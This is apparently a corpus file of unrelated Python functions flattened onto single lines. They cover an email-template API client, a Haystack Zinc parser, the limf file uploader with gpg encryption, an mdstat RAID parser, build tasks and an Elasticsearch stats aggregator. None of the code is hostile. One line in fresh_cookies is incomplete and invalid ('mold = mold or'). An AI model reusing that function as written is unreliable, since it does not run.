def get_template ( self , template_id , version = None , timeout = None ) : if ( version ) : return self . _api_request ( self . TEMPLATES_VERSION_ENDPOINT % ( template_id , version ) , self . HTTP_GET , timeout = timeout ) else : return self . _api_request ( self . TEMPLATES_SPECIFIC_ENDPOINT % template_id , self . HTTP_GET , timeout = timeout )
def create_template ( self , name , subject , html , text = '' , timeout = None ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } return self . _api_request ( self . TEMPLATES_ENDPOINT , self . HTTP_POST , payload = payload , timeout = timeout )
def create_new_locale ( self , template_id , locale , version_name , subject , text = '' , html = '' , timeout = None ) : payload = { 'locale' : locale , 'name' : version_name , 'subject' : subject } if html : payload [ 'html' ] = html if text : payload [ 'text' ] = text return self . _api_request ( self . TEMPLATES_LOCALES_ENDPOINT % template_id , self . HTTP_POST , payload = payload , timeout = timeout )
def create_new_version ( self , name , subject , text = '' , template_id = None , html = None , locale = None , timeout = None ) : if ( html ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } else : payload = { 'name' : name , 'subject' : subject , 'text' : text } if locale : url = self . TEMPLATES_SPECIFIC_LOCALE_VERSIONS_ENDPOINT % ( template_id , locale ) else : url = self . TEMPLATES_NEW_VERSION_ENDPOINT % template_id return self . _api_request ( url , self . HTTP_POST , payload = payload , timeout = timeout )
def update_template_version ( self , name , subject , template_id , version_id , text = '' , html = None , timeout = None ) : if ( html ) : payload = { 'name' : name , 'subject' : subject , 'html' : html , 'text' : text } else : payload = { 'name' : name , 'subject' : subject , 'text' : text } return self . _api_request ( self . TEMPLATES_VERSION_ENDPOINT % ( template_id , version_id ) , self . HTTP_PUT , payload = payload , timeout = timeout )
def snippets ( self , timeout = None ) : return self . _api_request ( self . SNIPPETS_ENDPOINT , self . HTTP_GET , timeout = timeout )
def get_snippet ( self , snippet_id , timeout = None ) : return self . _api_request ( self . SNIPPET_ENDPOINT % ( snippet_id ) , self . HTTP_GET , timeout = timeout )
def create_snippet ( self , name , body , timeout = None ) : payload = { 'name' : name , 'body' : body } return self . _api_request ( self . SNIPPETS_ENDPOINT , self . HTTP_POST , payload = payload , timeout = timeout )
def _make_file_dict ( self , f ) : if isinstance ( f , dict ) : file_obj = f [ 'file' ] if 'filename' in f : file_name = f [ 'filename' ] else : file_name = file_obj . name else : file_obj = f file_name = f . name b64_data = base64 . b64encode ( file_obj . read ( ) ) return { 'id' : file_name , 'data' : b64_data . decode ( ) if six . PY3 else b64_data , }
def send ( self , email_id , recipient , email_data = None , sender = None , cc = None , bcc = None , tags = [ ] , headers = { } , esp_account = None , locale = None , email_version_name = None , inline = None , files = [ ] , timeout = None ) : if not email_data : email_data = { } # for backwards compatibility, will be removed if isinstance ( recipient , string_types ) : warnings . warn ( "Passing email directly for recipient is deprecated" , DeprecationWarning ) recipient = { 'address' : recipient } payload = { 'email_id' : email_id , 'recipient' : recipient , 'email_data' : email_data } if sender : payload [ 'sender' ] = sender if cc : if not type ( cc ) == list : logger . error ( 'kwarg cc must be type(list), got %s' % type ( cc ) ) payload [ 'cc' ] = cc if bcc : if not type ( bcc ) == list : logger . error ( 'kwarg bcc must be type(list), got %s' % type ( bcc ) ) payload [ 'bcc' ] = bcc if tags : if not type ( tags ) == list : logger . error ( 'kwarg tags must be type(list), got %s' % ( type ( tags ) ) ) payload [ 'tags' ] = tags if headers : if not type ( headers ) == dict : logger . error ( 'kwarg headers must be type(dict), got %s' % ( type ( headers ) ) ) payload [ 'headers' ] = headers if esp_account : if not isinstance ( esp_account , string_types ) : logger . error ( 'kwarg esp_account must be a string, got %s' % ( type ( esp_account ) ) ) payload [ 'esp_account' ] = esp_account if locale : if not isinstance ( locale , string_types ) : logger . error ( 'kwarg locale must be a string, got %s' % ( type ( locale ) ) ) payload [ 'locale' ] = locale if email_version_name : if not isinstance ( email_version_name , string_types ) : logger . error ( 'kwarg email_version_name must be a string, got %s' % ( type ( email_version_name ) ) ) payload [ 'version_name' ] = email_version_name if inline : payload [ 'inline' ] = self . _make_file_dict ( inline ) if files : payload [ 'files' ] = [ self . _make_file_dict ( f ) for f in files ] return self . _api_request ( self . SEND_ENDPOINT , self . HTTP_POST , payload = payload , timeout = timeout )
def _api_request ( self , endpoint , http_method , * args , * * kwargs ) : logger . debug ( ' > Queing batch api request for endpoint: %s' % endpoint ) path = self . _build_request_path ( endpoint , absolute = False ) logger . debug ( '\tpath: %s' % path ) data = None if 'payload' in kwargs : data = kwargs [ 'payload' ] logger . debug ( '\tdata: %s' % data ) command = { "path" : path , "method" : http_method } if data : command [ 'body' ] = data self . _commands . append ( command )
def execute ( self , timeout = None ) : logger . debug ( ' > Batch API request (length %s)' % len ( self . _commands ) ) auth = self . _build_http_auth ( ) headers = self . _build_request_headers ( ) logger . debug ( '\tbatch headers: %s' % headers ) logger . debug ( '\tbatch command length: %s' % len ( self . _commands ) ) path = self . _build_request_path ( self . BATCH_ENDPOINT ) data = json . dumps ( self . _commands , cls = self . _json_encoder ) r = requests . post ( path , auth = auth , headers = headers , data = data , timeout = ( self . DEFAULT_TIMEOUT if timeout is None else timeout ) ) self . _commands = [ ] logger . debug ( '\tresponse code:%s' % r . status_code ) try : logger . debug ( '\tresponse: %s' % r . json ( ) ) except : logger . debug ( '\tresponse: %s' % r . content ) return r
def dump_grid ( grid ) : header = 'ver:%s' % dump_str ( str ( grid . _version ) , version = grid . _version ) if bool ( grid . metadata ) : header += ' ' + dump_meta ( grid . metadata , version = grid . _version ) columns = dump_columns ( grid . column , version = grid . _version ) rows = dump_rows ( grid ) return '\n' . join ( [ header , columns ] + rows + [ '' ] )
def parse ( grid_str , mode = MODE_ZINC , charset = 'utf-8' ) : # Decode incoming text (or python3 will whine!) if isinstance ( grid_str , six . binary_type ) : grid_str = grid_str . decode ( encoding = charset ) # Split the separate grids up, the grammar definition has trouble splitting # them up normally.  This will truncate the newline off the end of the last # row. _parse = functools . partial ( parse_grid , mode = mode , charset = charset ) if mode == MODE_JSON : if isinstance ( grid_str , six . string_types ) : grid_data = json . loads ( grid_str ) else : grid_data = grid_str if isinstance ( grid_data , dict ) : return _parse ( grid_data ) else : return list ( map ( _parse , grid_data ) ) else : return list ( map ( _parse , GRID_SEP . split ( grid_str . rstrip ( ) ) ) )
def append ( self , key , value = MARKER , replace = True ) : return self . add_item ( key , value , replace = replace )
def extend ( self , items , replace = True ) : if isinstance ( items , dict ) or isinstance ( items , SortableDict ) : items = list ( items . items ( ) ) for ( key , value ) in items : self . append ( key , value , replace = replace )
def _kwargs ( self ) : return dict ( color = self . color , velocity = self . velocity , colors = self . colors )
def draw ( self ) : if self . enabled : self . _vertex_list . colors = self . _gl_colors self . _vertex_list . vertices = self . _gl_vertices self . _vertex_list . draw ( pyglet . gl . GL_TRIANGLES )
def _map_timezones ( ) : tz_map = { } todo = HAYSTACK_TIMEZONES_SET . copy ( ) for full_tz in pytz . all_timezones : # Finished case: if not bool ( todo ) : # pragma: no cover # This is nearly impossible for us to cover, and an unlikely case. break # Case 1: exact match if full_tz in todo : tz_map [ full_tz ] = full_tz # Exact match todo . discard ( full_tz ) continue # Case 2: suffix match after '/' if '/' not in full_tz : continue ( prefix , suffix ) = full_tz . split ( '/' , 1 ) # Case 2 exception: full timezone contains more than one '/' -> ignore if '/' in suffix : continue if suffix in todo : tz_map [ suffix ] = full_tz todo . discard ( suffix ) continue return tz_map
def timezone ( haystack_tz , version = LATEST_VER ) : tz_map = get_tz_map ( version = version ) try : tz_name = tz_map [ haystack_tz ] except KeyError : raise ValueError ( '%s is not a recognised timezone on this host' % haystack_tz ) return pytz . timezone ( tz_name )
def _unescape ( s , uri = False ) : out = '' while len ( s ) > 0 : c = s [ 0 ] if c == '\\' : # Backslash escape esc_c = s [ 1 ] if esc_c in ( 'u' , 'U' ) : # Unicode escape out += six . unichr ( int ( s [ 2 : 6 ] , base = 16 ) ) s = s [ 6 : ] continue else : if esc_c == 'b' : out += '\b' elif esc_c == 'f' : out += '\f' elif esc_c == 'n' : out += '\n' elif esc_c == 'r' : out += '\r' elif esc_c == 't' : out += '\t' else : if uri and ( esc_c == '#' ) : # \# is passed through with backslash. out += '\\' # Pass through out += esc_c s = s [ 2 : ] continue else : out += c s = s [ 1 : ] return out
def parse_grid ( grid_data ) : try : # Split the grid up. grid_parts = NEWLINE_RE . split ( grid_data ) if len ( grid_parts ) < 2 : raise ZincParseException ( 'Malformed grid received' , grid_data , 1 , 1 ) # Grid and column metadata are the first two lines. grid_meta_str = grid_parts . pop ( 0 ) col_meta_str = grid_parts . pop ( 0 ) # First element is the grid metadata ver_match = VERSION_RE . match ( grid_meta_str ) if ver_match is None : raise ZincParseException ( 'Could not determine version from %r' % grid_meta_str , grid_data , 1 , 1 ) version = Version ( ver_match . group ( 1 ) ) # Now parse the rest of the grid accordingly try : grid_meta = hs_gridMeta [ version ] . parseString ( grid_meta_str , parseAll = True ) [ 0 ] except pp . ParseException as pe : # Raise a new exception with the appropriate line number. raise ZincParseException ( 'Failed to parse grid metadata: %s' % pe , grid_data , 1 , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse grid meta: %r' , grid_meta_str ) raise try : col_meta = hs_cols [ version ] . parseString ( col_meta_str , parseAll = True ) [ 0 ] except pp . ParseException as pe : # Raise a new exception with the appropriate line number. raise ZincParseException ( 'Failed to parse column metadata: %s' % reformat_exception ( pe , 2 ) , grid_data , 2 , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse column meta: %r' , col_meta_str ) raise row_grammar = hs_row [ version ] def _parse_row ( row_num_and_data ) : ( row_num , row ) = row_num_and_data line_num = row_num + 3 try : return dict ( zip ( col_meta . keys ( ) , row_grammar . parseString ( row , parseAll = True ) [ 0 ] . asList ( ) ) ) except pp . ParseException as pe : # Raise a new exception with the appropriate line number. raise ZincParseException ( 'Failed to parse row: %s' % reformat_exception ( pe , line_num ) , grid_data , line_num , pe . col ) except : # pragma: no cover # Report an error to the log if we fail to parse something. LOG . debug ( 'Failed to parse row: %r' , row ) raise g = Grid ( version = grid_meta . pop ( 'ver' ) , metadata = grid_meta , columns = list ( col_meta . items ( ) ) ) g . extend ( map ( _parse_row , filter ( lambda gp : bool ( gp [ 1 ] ) , enumerate ( grid_parts ) ) ) ) return g except : LOG . debug ( 'Failing grid: %r' , grid_data ) raise
def parse_scalar ( scalar_data , version ) : try : return hs_scalar [ version ] . parseString ( scalar_data , parseAll = True ) [ 0 ] except pp . ParseException as pe : # Raise a new exception with the appropriate line number. raise ZincParseException ( 'Failed to parse scalar: %s' % reformat_exception ( pe ) , scalar_data , 1 , pe . col ) except : LOG . debug ( 'Failing scalar data: %r (version %r)' , scalar_data , version )
def dump ( grids , mode = MODE_ZINC ) : if isinstance ( grids , Grid ) : return dump_grid ( grids , mode = mode ) _dump = functools . partial ( dump_grid , mode = mode ) if mode == MODE_ZINC : return '\n' . join ( map ( _dump , grids ) ) elif mode == MODE_JSON : return '[%s]' % ',' . join ( map ( _dump , grids ) ) else : # pragma: no cover raise NotImplementedError ( 'Format not implemented: %s' % mode )
def nearest ( self , ver ) : if not isinstance ( ver , Version ) : ver = Version ( ver ) if ver in OFFICIAL_VERSIONS : return ver # We might not have an exact match for that. # See if we have one that's newer than the grid we're looking at. versions = list ( OFFICIAL_VERSIONS ) versions . sort ( reverse = True ) best = None for candidate in versions : # Due to ambiguities, we might have an exact match and not know it. # '2.0' will not hash to the same value as '2.0.0', but both are # equivalent. if candidate == ver : # We can't beat this, make a note of the match for later return candidate # If we have not seen a better candidate, and this is older # then we may have to settle for that. if ( best is None ) and ( candidate < ver ) : warnings . warn ( 'This version of hszinc does not yet ' 'support version %s, please seek a newer version ' 'or file a bug.  Closest (older) version supported is %s.' % ( ver , candidate ) ) return candidate # Probably the best so far, but see if we can go closer if candidate > ver : best = candidate # Unhappy path, no best option?  This should not happen. assert best is not None warnings . warn ( 'This version of hszinc does not yet ' 'support version %s, please seek a newer version ' 'or file a bug.  Closest (newer) version supported is %s.' % ( ver , best ) ) return best
def encrypt_files ( selected_host , only_link , file_name ) : if ENCRYPTION_DISABLED : print ( 'For encryption please install gpg' ) exit ( ) passphrase = '%030x' % random . randrange ( 16 ** 30 ) source_filename = file_name cmd = 'gpg --batch --symmetric --cipher-algo AES256 --passphrase-fd 0 ' '--output - {}' . format ( source_filename ) encrypted_output = Popen ( shlex . split ( cmd ) , stdout = PIPE , stdin = PIPE , stderr = PIPE ) encrypted_data = encrypted_output . communicate ( passphrase . encode ( ) ) [ 0 ] return upload_files ( encrypted_data , selected_host , only_link , file_name ) + '#' + passphrase
def check_max_filesize ( chosen_file , max_size ) : if os . path . getsize ( chosen_file ) > max_size : return False else : return True
def parse_arguments ( args , clone_list ) : returned_string = "" host_number = args . host if args . show_list : print ( generate_host_string ( clone_list , "Available hosts: " ) ) exit ( ) if args . decrypt : for i in args . files : print ( decrypt_files ( i ) ) exit ( ) if args . files : for i in args . files : if args . limit_size : if args . host == host_number and host_number is not None : if not check_max_filesize ( i , clone_list [ host_number ] [ 3 ] ) : host_number = None for n , host in enumerate ( clone_list ) : if not check_max_filesize ( i , host [ 3 ] ) : clone_list [ n ] = None if not clone_list : print ( 'None of the clones is able to support so big file.' ) if args . no_cloudflare : if args . host == host_number and host_number is not None and not clone_list [ host_number ] [ 4 ] : print ( "This host uses Cloudflare, please choose different host." ) exit ( 1 ) else : for n , host in enumerate ( clone_list ) : if not host [ 4 ] : clone_list [ n ] = None clone_list = list ( filter ( None , clone_list ) ) if host_number is None or args . host != host_number : host_number = random . randrange ( 0 , len ( clone_list ) ) while True : try : if args . encrypt : returned_string = encrypt_files ( clone_list [ host_number ] , args . only_link , i ) else : returned_string = upload_files ( open ( i , 'rb' ) , clone_list [ host_number ] , args . only_link , i ) if args . only_link : print ( returned_string [ 0 ] ) else : print ( returned_string ) except IndexError : #print('Selected server (' + clone_list[host_number][0] + ') is offline.') #print('Trying other host.') host_number = random . randrange ( 0 , len ( clone_list ) ) continue except IsADirectoryError : print ( 'limf does not support directory upload, if you want to upload ' 'every file in directory use limf {}/*.' . format ( i . replace ( '/' , '' ) ) ) if args . log : with open ( os . path . expanduser ( args . logfile ) , "a+" ) as logfile : if args . only_link : logfile . write ( returned_string [ 1 ] ) else : logfile . write ( returned_string ) logfile . write ( "\n" ) break else : print ( "limf: try 'limf -h' for more information" )
def decrypt_files ( file_link ) : if ENCRYPTION_DISABLED : print ( 'For decryption please install gpg' ) exit ( ) try : parsed_link = re . findall ( r'(.*/(.*))#(.{30})' , file_link ) [ 0 ] req = urllib . request . Request ( parsed_link [ 0 ] , data = None , headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) ' ' AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36' } ) #downloads the file using fake useragent file_response = urllib . request . urlopen ( req ) file_to_decrypt = file_response . read ( ) #decrypts the data using piping to ggp decrypt_r , decrypt_w = os . pipe ( ) cmd = 'gpg --batch --decrypt --passphrase-fd {}' . format ( decrypt_r ) decrypt_output = Popen ( shlex . split ( cmd ) , stdout = PIPE , stdin = PIPE , stderr = PIPE , pass_fds = ( decrypt_r , ) ) os . close ( decrypt_r ) open ( decrypt_w , 'w' ) . write ( parsed_link [ 2 ] ) decrypted_data , stderr = decrypt_output . communicate ( file_to_decrypt ) with open ( parsed_link [ 1 ] , 'wb' ) as decrypted_file : decrypted_file . write ( decrypted_data ) return parsed_link [ 1 ] + ' is decrypted and saved.' except IndexError : return 'Please enter valid link.'
def set_value ( request ) : key = request . matchdict [ 'key' ] _VALUES [ key ] = request . json_body return _VALUES . get ( key )
def main ( ) : parser = argparse . ArgumentParser ( description = _ ( 'Uploads selected file to working pomf.se clone' ) ) parser . add_argument ( 'files' , metavar = 'file' , nargs = '*' , type = str , help = _ ( 'Files to upload' ) ) parser . add_argument ( '-c' , metavar = 'host_number' , type = int , dest = 'host' , default = None , help = _ ( 'The number (0-n) of the selected host (default is random)' ) ) parser . add_argument ( '-l' , dest = 'only_link' , action = 'store_const' , const = True , default = False , help = _ ( 'Changes output to just link to the file' ) ) parser . add_argument ( '-e' , dest = 'encrypt' , action = 'store_const' , const = True , default = False , help = _ ( 'Encrypts then uploads the files.' ) ) parser . add_argument ( '-d' , dest = 'decrypt' , action = 'store_const' , const = True , default = False , help = _ ( 'Decrypts files from links with encrypted files' ) ) parser . add_argument ( '-j' , dest = "local_list" , default = False , help = _ ( 'Path to a local list file' ) ) parser . add_argument ( '-s' , dest = "show_list" , action = 'store_const' , const = True , default = False , help = _ ( 'Show the host list (will not upload your files when called)' ) ) parser . add_argument ( '-m' , dest = 'limit_size' , action = 'store_const' , const = True , default = False , help = _ ( 'Do not upload file if it exceeds the certain host limit' ) ) parser . add_argument ( '-nc' , dest = 'no_cloudflare' , action = 'store_const' , const = True , default = False , help = _ ( 'Do not use hosts which use Cloudflare.' ) ) parser . add_argument ( '--log-file' , metavar = "LOGFILE" , dest = "logfile" , default = "~/limf.log" , help = _ ( "The location of log file" ) ) parser . add_argument ( '--log' , dest = 'log' , action = "store_const" , const = True , default = False , help = _ ( "Enables the logging feature, default logfile is ~/limf.log" ) ) args = parser . parse_args ( ) try : if args . local_list : clone_list = retrieve_local_host_list ( args . local_list ) else : clone_list = retrieve_online_host_list ( ) if len ( min ( clone_list , key = len ) ) < 5 and ( args . limit_size or args . no_cloudflare ) : print ( _ ( "For newer options, please update your host_list." ) ) exit ( ) if args . host and not ( 0 <= args . host < len ( clone_list ) ) : print ( generate_host_string ( clone_list ) ) exit ( ) parse_arguments ( args , clone_list ) except FileNotFoundError : print ( _ ( 'Plese enter valid file.' ) )
def convert ( self , schema_node , definition_handler ) : converted = { 'name' : schema_node . name , 'in' : self . _in , 'required' : schema_node . required } if schema_node . description : converted [ 'description' ] = schema_node . description if schema_node . default : converted [ 'default' ] = schema_node . default schema = definition_handler ( schema_node ) # Parameters shouldn't have a title schema . pop ( 'title' , None ) converted . update ( schema ) if schema . get ( 'type' ) == 'array' : converted [ 'items' ] = { 'type' : schema [ 'items' ] [ 'type' ] } return converted
def get_transition_viewset_method ( transition_name , * * kwargs ) : @ detail_route ( methods = [ 'post' ] , * * kwargs ) def inner_func ( self , request , pk = None , * * kwargs ) : object = self . get_object ( ) transition_method = getattr ( object , transition_name ) transition_method ( by = self . request . user ) if self . save_after_transition : object . save ( ) serializer = self . get_serializer ( object ) return Response ( serializer . data ) return inner_func
def fresh_cookies ( ctx , mold = '' ) : mold = mold or # TODO: URL from config tmpdir = os . path . join ( tempfile . gettempdir ( ) , "cc-upgrade-pygments-markdown-lexer" ) if os . path . isdir ( '.git' ) : # TODO: Ensure there are no local unstashed changes pass # Make a copy of the new mold version if os . path . isdir ( tmpdir ) : shutil . rmtree ( tmpdir ) if os . path . exists ( mold ) : shutil . copytree ( mold , tmpdir , ignore = shutil . ignore_patterns ( ".git" , ".svn" , "*~" , ) ) else : ctx . run ( "git clone {} {}" . format ( mold , tmpdir ) ) # Copy recorded "cookiecutter.json" into mold shutil . copy2 ( "project.d/cookiecutter.json" , tmpdir ) with pushd ( '..' ) : ctx . run ( "cookiecutter --no-input {}" . format ( tmpdir ) ) if os . path . exists ( '.git' ) : ctx . run ( "git status" )
def ci ( ctx ) : opts = [ '' ] # 'tox' makes no sense in Travis if os . environ . get ( 'TRAVIS' , '' ) . lower ( ) == 'true' : opts += [ 'test.pytest' ] else : opts += [ 'test.tox' ] ctx . run ( "invoke --echo --pty clean --all build --docs check --reports{}" . format ( ' ' . join ( opts ) ) )
def _build_metadata ( ) : # pylint: disable=too-many-locals, too-many-branches # Handle metadata in package source expected_keys = ( 'url' , 'version' , 'license' , 'author' , 'author_email' , 'long_description' , 'keywords' ) metadata = { } with io . open ( srcfile ( 'src' , package_name , '__init__.py' ) , encoding = 'utf-8' ) as handle : pkg_init = handle . read ( ) # Get default long description from docstring metadata [ 'long_description' ] = re . search ( r'^"""(.+?)^"""$' , pkg_init , re . DOTALL | re . MULTILINE ) . group ( 1 ) for line in pkg_init . splitlines ( ) : match = re . match ( r"""^__({0})__ += (?P<q>['"])(.+?)(?P=q)$""" . format ( '|' . join ( expected_keys ) ) , line ) if match : metadata [ match . group ( 1 ) ] = match . group ( 3 ) if not all ( i in metadata for i in expected_keys ) : raise RuntimeError ( "Missing or bad metadata in '{0}' package: {1}" . format ( name , ', ' . join ( sorted ( set ( expected_keys ) - set ( metadata . keys ( ) ) ) ) , ) ) text = metadata [ 'long_description' ] . strip ( ) if text : metadata [ 'description' ] , text = text . split ( '.' , 1 ) metadata [ 'description' ] = ' ' . join ( metadata [ 'description' ] . split ( ) ) . strip ( ) + '.' # normalize whitespace metadata [ 'long_description' ] = textwrap . dedent ( text ) . strip ( ) metadata [ 'keywords' ] = metadata [ 'keywords' ] . replace ( ',' , ' ' ) . strip ( ) . split ( ) # Load requirements files requirements_files = dict ( install = 'requirements.txt' , setup = 'setup-requirements.txt' , test = 'test-requirements.txt' , ) requires = { } for key , filename in requirements_files . items ( ) : requires [ key ] = [ ] if os . path . exists ( srcfile ( filename ) ) : with io . open ( srcfile ( filename ) , encoding = 'utf-8' ) as handle : for line in handle : line = line . strip ( ) if line and not line . startswith ( '#' ) : if any ( line . startswith ( i ) for i in ( '-e' , 'http://' , 'https://' ) ) : line = line . split ( '#egg=' ) [ 1 ] requires [ key ] . append ( line ) if not any ( 'pytest' == re . split ( '[\t ,<=>]' , i . lower ( ) ) [ 0 ] for i in requires [ 'test' ] ) : requires [ 'test' ] . append ( 'pytest' ) # add missing requirement # CLI entry points console_scripts = [ ] for path , dirs , files in os . walk ( srcfile ( 'src' , package_name ) ) : dirs = [ i for i in dirs if not i . startswith ( '.' ) ] if '__main__.py' in files : path = path [ len ( srcfile ( 'src' ) + os . sep ) : ] appname = path . split ( os . sep ) [ - 1 ] with io . open ( srcfile ( 'src' , path , '__main__.py' ) , encoding = 'utf-8' ) as handle : for line in handle . readlines ( ) : match = re . match ( r"""^__app_name__ += (?P<q>['"])(.+?)(?P=q)$""" , line ) if match : appname = match . group ( 2 ) console_scripts . append ( '{0} = {1}.__main__:cli' . format ( appname , path . replace ( os . sep , '.' ) ) ) # Add some common files to EGG-INFO candidate_files = [ 'LICENSE' , 'NOTICE' , 'README' , 'README.md' , 'README.rst' , 'README.txt' , 'CHANGES' , 'CHANGELOG' , 'debian/changelog' , ] data_files = defaultdict ( list ) for filename in candidate_files : if os . path . exists ( srcfile ( filename ) ) : data_files [ 'EGG-INFO' ] . append ( filename ) # Complete project metadata classifiers = [ ] for classifiers_txt in ( 'classifiers.txt' , 'project.d/classifiers.txt' ) : classifiers_txt = srcfile ( classifiers_txt ) if os . path . exists ( classifiers_txt ) : with io . open ( classifiers_txt , encoding = 'utf-8' ) as handle : classifiers = [ i . strip ( ) for i in handle if i . strip ( ) and not i . startswith ( '#' ) ] break entry_points . setdefault ( 'console_scripts' , [ ] ) . extend ( console_scripts ) metadata . update ( dict ( name = name , package_dir = { '' : 'src' } , packages = find_packages ( srcfile ( 'src' ) , exclude = [ 'tests' ] ) , data_files = data_files . items ( ) , zip_safe = False , include_package_data = True , install_requires = requires [ 'install' ] , setup_requires = requires [ 'setup' ] , tests_require = requires [ 'test' ] , classifiers = classifiers , cmdclass = dict ( test = PyTest , ) , entry_points = entry_points , ) ) return metadata
def load ( self ) : ret = { } # Read the mdstat file with open ( self . get_path ( ) , 'r' ) as f : # lines is a list of line (with \n) lines = f . readlines ( ) # First line: get the personalities # The "Personalities" line tells you what RAID level the kernel currently supports. # This can be changed by either changing the raid modules or recompiling the kernel. # Possible personalities include: [raid0] [raid1] [raid4] [raid5] [raid6] [linear] [multipath] [faulty] ret [ 'personalities' ] = self . get_personalities ( lines [ 0 ] ) # Second to last before line: Array definition ret [ 'arrays' ] = self . get_arrays ( lines [ 1 : - 1 ] , ret [ 'personalities' ] ) # Save the file content as it for the __str__ method self . content = reduce ( lambda x , y : x + y , lines ) return ret
def get_personalities ( self , line ) : return [ split ( '\W+' , i ) [ 1 ] for i in line . split ( ':' ) [ 1 ] . split ( ' ' ) if i . startswith ( '[' ) ]
def get_arrays ( self , lines , personalities = [ ] ) : ret = { } i = 0 while i < len ( lines ) : try : # First array line: get the md device md_device = self . get_md_device_name ( lines [ i ] ) except IndexError : # No array detected pass else : # Array detected if md_device is not None : # md device line ret [ md_device ] = self . get_md_device ( lines [ i ] , personalities ) # md config/status line i += 1 ret [ md_device ] . update ( self . get_md_status ( lines [ i ] ) ) i += 1 return ret
def get_md_device ( self , line , personalities = [ ] ) : ret = { } splitted = split ( '\W+' , line ) # Raid status # Active or 'started'. An inactive array is usually faulty. # Stopped arrays aren't visible here. ret [ 'status' ] = splitted [ 1 ] if splitted [ 2 ] in personalities : # Raid type (ex: RAID5) ret [ 'type' ] = splitted [ 2 ] # Array's components ret [ 'components' ] = self . get_components ( line , with_type = True ) else : # Raid type (ex: RAID5) ret [ 'type' ] = None # Array's components ret [ 'components' ] = self . get_components ( line , with_type = False ) return ret
def get_md_status ( self , line ) : ret = { } splitted = split ( '\W+' , line ) if len ( splitted ) < 7 : ret [ 'available' ] = None ret [ 'used' ] = None ret [ 'config' ] = None else : # The final 2 entries on this line: [n/m] [UUUU_] # [n/m] means that ideally the array would have n devices however, currently, m devices are in use. # Obviously when m >= n then things are good. ret [ 'available' ] = splitted [ - 4 ] ret [ 'used' ] = splitted [ - 3 ] # [UUUU_] represents the status of each device, either U for up or _ for down. ret [ 'config' ] = splitted [ - 2 ] return ret
def register_receivers ( app , config ) : for event_name , event_config in config . items ( ) : event_builders = [ obj_or_import_string ( func ) for func in event_config . get ( 'event_builders' , [ ] ) ] signal = obj_or_import_string ( event_config [ 'signal' ] ) signal . connect ( EventEmmiter ( event_name , event_builders ) , sender = app , weak = False )
def set_scheduled ( self ) : with self . _idle_lock : if self . _idle : self . _idle = False return True return False
def _get_oldest_event_timestamp ( self ) : # Retrieve the oldest event in order to start aggregation # from there query_events = Search ( using = self . client , index = self . event_index ) [ 0 : 1 ] . sort ( { 'timestamp' : { 'order' : 'asc' } } ) result = query_events . execute ( ) # There might not be any events yet if the first event have been # indexed but the indices have not been refreshed yet. if len ( result ) == 0 : return None return parser . parse ( result [ 0 ] [ 'timestamp' ] )
def get_bookmark ( self ) : if not Index ( self . aggregation_alias , using = self . client ) . exists ( ) : if not Index ( self . event_index , using = self . client ) . exists ( ) : return datetime . date . today ( ) return self . _get_oldest_event_timestamp ( ) # retrieve the oldest bookmark query_bookmark = Search ( using = self . client , index = self . aggregation_alias , doc_type = self . bookmark_doc_type ) [ 0 : 1 ] . sort ( { 'date' : { 'order' : 'desc' } } ) bookmarks = query_bookmark . execute ( ) # if no bookmark is found but the index exist, the bookmark was somehow # lost or never written, so restart from the beginning if len ( bookmarks ) == 0 : return self . _get_oldest_event_timestamp ( ) # change it to doc_id_suffix bookmark = datetime . datetime . strptime ( bookmarks [ 0 ] . date , self . doc_id_suffix ) return bookmark
def set_bookmark ( self ) : def _success_date ( ) : bookmark = { 'date' : self . new_bookmark or datetime . datetime . utcnow ( ) . strftime ( self . doc_id_suffix ) } yield dict ( _index = self . last_index_written , _type = self . bookmark_doc_type , _source = bookmark ) if self . last_index_written : bulk ( self . client , _success_date ( ) , stats_only = True )
def _format_range_dt ( self , d ) : if not isinstance ( d , six . string_types ) : d = d . isoformat ( ) return '{0}||/{1}' . format ( d , self . dt_rounding_map [ self . aggregation_interval ] )
def agg_iter ( self , lower_limit = None , upper_limit = None ) : lower_limit = lower_limit or self . get_bookmark ( ) . isoformat ( ) upper_limit = upper_limit or ( datetime . datetime . utcnow ( ) . replace ( microsecond = 0 ) . isoformat ( ) ) aggregation_data = { } self . agg_query = Search ( using = self . client , index = self . event_index ) . filter ( 'range' , timestamp = { 'gte' : self . _format_range_dt ( lower_limit ) , 'lte' : self . _format_range_dt ( upper_limit ) } ) # apply query modifiers for modifier in self . query_modifiers : self . agg_query = modifier ( self . agg_query ) hist = self . agg_query . aggs . bucket ( 'histogram' , 'date_histogram' , field = 'timestamp' , interval = self . aggregation_interval ) terms = hist . bucket ( 'terms' , 'terms' , field = self . aggregation_field , size = 0 ) top = terms . metric ( 'top_hit' , 'top_hits' , size = 1 , sort = { 'timestamp' : 'desc' } ) for dst , ( metric , src , opts ) in self . metric_aggregation_fields . items ( ) : terms . metric ( dst , metric , field = src , * * opts ) results = self . agg_query . execute ( ) index_name = None for interval in results . aggregations [ 'histogram' ] . buckets : interval_date = datetime . datetime . strptime ( interval [ 'key_as_string' ] , '%Y-%m-%dT%H:%M:%S' ) for aggregation in interval [ 'terms' ] . buckets : aggregation_data [ 'timestamp' ] = interval_date . isoformat ( ) aggregation_data [ self . aggregation_field ] = aggregation [ 'key' ] aggregation_data [ 'count' ] = aggregation [ 'doc_count' ] if self . metric_aggregation_fields : for f in self . metric_aggregation_fields : aggregation_data [ f ] = aggregation [ f ] [ 'value' ] doc = aggregation . top_hit . hits . hits [ 0 ] [ '_source' ] for destination , source in self . copy_fields . items ( ) : if isinstance ( source , six . string_types ) : aggregation_data [ destination ] = doc [ source ] else : aggregation_data [ destination ] = source ( doc , aggregation_data ) index_name = 'stats-{0}-{1}' . format ( self . event , interval_date . strftime ( self . index_name_suffix ) ) self . indices . add ( index_name ) yield dict ( _id = '{0}-{1}' . format ( aggregation [ 'key' ] , interval_date . strftime ( self . doc_id_suffix ) ) , _index = index_name , _type = self . aggregation_doc_type , _source = aggregation_data ) self . last_index_written = index_name
